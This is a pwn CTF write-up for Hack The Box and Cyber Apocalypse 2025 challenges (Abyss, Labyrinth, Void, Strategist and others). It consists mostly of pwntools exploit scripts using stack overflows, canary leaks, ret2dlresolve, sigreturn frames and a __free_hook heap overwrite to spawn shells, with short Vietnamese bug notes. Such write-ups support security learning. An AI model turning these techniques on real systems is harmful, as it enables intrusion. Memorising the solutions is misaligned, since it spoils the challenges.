# HACK-THE-BOX Write up for some pwn challenge

## CTF TRY OUT
### Abyss
    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *


    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./abyss_patched', checksec=False)
    #libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc

    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* 0x0000000000401350
            b* 0x00000000004013D5
            b* 0x00000000004014A7

            c
            ''')
            input()

    if args.remote:
        p = remote('94.237.55.96',43841)  
    else:
        p = process(exe.path)  

    #GDB()



    s(b'\0'*4) #cmd_login
    sleep(1)
    payload = b'USER ' + b'a'*17
    payload += b'\x1c' + b'b'*11
    payload += p64(exe.sym.cmd_read + 66) 
    s(payload)
    sleep(3)
    payload = b"PASS " + b"c"*507
    s(payload)
    sleep(1)
    payload = b"./flag.txt\0"
    s(payload)



    p.interactive()
### Labyrinth
    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *


    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./labyrinth_patched', checksec=False)
    #libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc

    #context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* 0x00000000004015D5

            c
            ''')
            input()

    if args.remote:
        p = remote('94.237.59.30',36382)  
    else:
        p = process(exe.path)  

    #GDB()

    sl(b'069')
    ret = 0x0000000000401016
    pl = flat(
        b'a'*0x38,
        p32(ret),
        p32(0),
        p32(exe.sym.escape_plan),
        p32(0),

    )
    sl(pl)



    p.interactive()


### Regularity
    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *


    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./regularity', checksec=False)
    #libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc

    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* read+35

            c
            ''')
            input()

    if args.remote:
        p = remote('83.136.249.46',33766)  
    else:
        p = process(exe.path)  

    GDB()

    jump_rsi = 0x0000000000401041

    shell = asm(
        '''
        mov rbx, 29400045130965551
        push rbx

        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
        ''',arch='amd64'
    )

    pl = flat(
        shell.ljust(0x100,b'a'),
        jump_rsi, 
    )
    s(pl)





    p.interactive()

### Void
    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *


    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./void_patched', checksec=False)
    #libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc

    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* vuln+31

            c
            ''')
            input()

    if args.remote:
        p = remote('94.237.55.128',30805)  
    else:
        p = process(exe.path)  

    #GDB()

    dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh\0'])
    rop = ROP(exe)
    rop.read(0, dlresolve.data_addr)
    rop.raw(rop.ret[0])
    rop.ret2dlresolve(dlresolve)
    raw_rop = rop.chain()

    pl = flat(
        b'a'*72,
        raw_rop,

    )

    p.send(pl)

    p.send(dlresolve.payload)






    p.interactive()


## Cyber Apocalypse CTF 2025

### Quack Quack
Source 
![image](https://hackmd.io/_uploads/SkfXvj1pyx.png)
Lỗi buffer overfouw ngay hàm read. 
![image](https://hackmd.io/_uploads/HkjMdjJakg.png)
Check strstr nó lỗi check liên tục nêu là Quack Quack nên ta có thể leak được canary

    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *
    from ctypes import cdll



    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./quack_quack_patched', checksec=False)
    #libc = ELF('./libc-2.23.so', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc


    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* 0x0000000000401578

            c
            ''')
            input()

    if args.remote:
        p = remote('host3.dreamhack.games',18525)  
    else:
        p = process(exe.path) 



    #GDB()


    s(b'a'*89+b'Quack Quack ')

    p.recvuntil(b'the Duck!')
    p.recvuntil(b'Quack Quack ')

    canary = u64(b'\0' + p.recv(7))
    print("canary = " + hex(canary))

    pl = flat(
        b'c'*88,
        canary,
        0,
        exe.sym.duck_attack,
    )

    s(pl)

    p.interactive()

### Laconic
Lỗi buffer overflow dùng kỹ thuật Sigreturn
    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *
    from ctypes import cdll



    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./laconic', checksec=False)
    #libc = ELF('./libc-2.23.so', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc


    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* 0x0000000000043015

            c
            ''')
            input()

    if args.remote:
        p = remote('host3.dreamhack.games',18525)  
    else:
        p = process(exe.path) 



    #GDB()


    pop_rax = 0x0000000000043018
    mov_rdx_syscall = 0x000000000004300e
    syscall = 0x0000000000043015
    bin_sh = 0x43238

    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = bin_sh
    frame.rsi = 0
    frame.rdx = 0
    frame.rsp = 0
    frame.rip = syscall


    pl = flat(
        b'a'*8,
        pop_rax,0xf,
        syscall, 
        bytes(frame),

    )
    s(pl)
    p.interactive()


### Blessing
Check source
![image](https://hackmd.io/_uploads/r1XCYo1TJx.png)
Bug chỗ này 
![image](https://hackmd.io/_uploads/HJOV9jy61x.png)
Nếu ta malloc một size siêu siêu lớn nó sẽ return null. Vậy ta chỉ cần malloc size v6 được leak thì cái size = v6 và buf = 0 thì nó sẽ set v6 = 0 và read flag thôi.


    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *
    from ctypes import cdll



    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./blessing_patched', checksec=False)
    #libc = ELF('./libc-2.23.so', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc


    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* main+273
            b*main+353

            c
            ''')
            input()

    if args.remote:
        p = remote('94.237.54.189',47821)  
    else:
        p = process(exe.path) 



    #GDB()
    p.recvuntil(b'this: ')

    v6 = int(p.recv(14),16)
    print('v6 = ' + hex(v6))

    offset = v6+1
    sl(f'{offset}')

    pl = flat(b'a')
    s(pl)



    p.interactive()



Strategit

![image](https://hackmd.io/_uploads/SkvRisJTyg.png)

Bug nằm đây strlen() nó sẽ đếm đến khi nào gặp ký tự null nên ta có thể ghi đề 1 byte

    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *
    from ctypes import cdll



    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./strategist_patched', checksec=False)
    libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc


    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            b* create_plan+173
            b* show_plan+252
            b* edit_plan+96
            b* edit_plan+251
            b* delete_plan+213
            c
            ''')
            input()

    if args.remote:
        p = remote('host3.dreamhack.games',18525)  
    else:
        p = process(exe.path) 






    def create(size,data):
        sla(b'> ',b'1')
        sla(b'> ',str(size).encode())
        sa(b'> ',data)

    def show(idx):
        sla(b'> ',b'2')
        sla(b'> ',str(idx).encode())

    def edit(idx,data):
        sla(b'> ',b'3')
        sla(b'> ',str(idx).encode())
        sa(b'> ',data)

    def delete(idx):
        sla(b'> ',b'4')
        sla(b'> ',str(idx).encode())


    create(0x500,b'ntn')    #0
    create(24,b'b'*24)  #1
    create(24,b'c'*24)  #2
    create(24,b'd'*24)  #3
    create(24,b'f'*24)  #4
    create(24,b'/bin/sh')  #5

    #GDB()

    delete(0)
    create(0x20,b'a')

    show(0)

    p.recvuntil(b'Plan [0]: ')
    leak = p.recv(6)
    leak = u64(leak.ljust(8,b'\0'))
    print("leak = " + hex(leak))

    libc.address = leak - 0x3ec061
    print("libc base = " + hex(libc.address))

    free_hook = libc.sym['__free_hook']
    print("free hook = " + hex(free_hook))


    edit(1,b'a'*24 + p8(0xd1))
    delete(2)
    delete(4)
    delete(3)


    create(200,b'a'*24 + p64(0x0000000000000021) + p64(free_hook))
    create(24,b'null')
    create(24,p64(libc.sym.system))

    delete(5)






    p.interactive()

### Contractor

    #!/usr/bin/python3

    from pwn import *
    import argparse
    from time import *
    from ctypes import cdll



    parser = argparse.ArgumentParser(description='Exploit script')
    parser.add_argument('remote', nargs='?', default=None, help='Run the exploit on a remote server')
    args = parser.parse_args()

    exe = ELF('./contractor_patched', checksec=False)
    libc = ELF('./libc.so.6', checksec=False)
    #ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
    #libc = exe.libc


    context.binary = exe
    context.terminal = ['wt.exe','-d', '.', 'wsl.exe', '-d', 'Ubuntu-22.04']

    info = lambda msg: log.info(msg)
    sla = lambda msg, data: p.sendlineafter(msg, data)
    sa = lambda msg, data: p.sendafter(msg, data)
    sl = lambda data: p.sendline(data)
    s = lambda data: p.send(data)
    sln = lambda msg, num: sla(msg, str(num).encode())
    sn = lambda msg, num: sa(msg, str(num).encode())

    def GDB():
        if args.remote is None:
            gdb.attach(p, gdbscript='''
            brva 0x000000000000170B
            brva 0x0000000000001997

            c
            ''')
            input()

    if args.remote:
        p = remote('94.237.63.32',30659)  
    else:
        p = process(exe.path) 



    #GDB()

    s(b'a'*16)

    sl(b'b'*256)

    sl(b'1')

    s(b'c'*16)

    p.recvuntil(b'[Specialty]: cccccccccccccccc')

    leak_exe = u64(p.recv(6).ljust(8,b'\0'))
    print('leak exe = ' + hex(leak_exe))
    exe.address = leak_exe - 0x1b50
    print('exe_base = ' + hex(exe.address))

    sl(b'4')

    pl = flat(
        b'd'*28,
        p32(1),
        b'\x1f', #CHAY NO ASLR moi ra chay tren sever cung la byte \x1f con ko thi phai burte force
                # *((_BYTE *)s + i + 280) = safe_buffer; tinh offset sao cho nhap tai return address
        exe.sym.contract,
    )
    sl(pl)


    p.interactive()
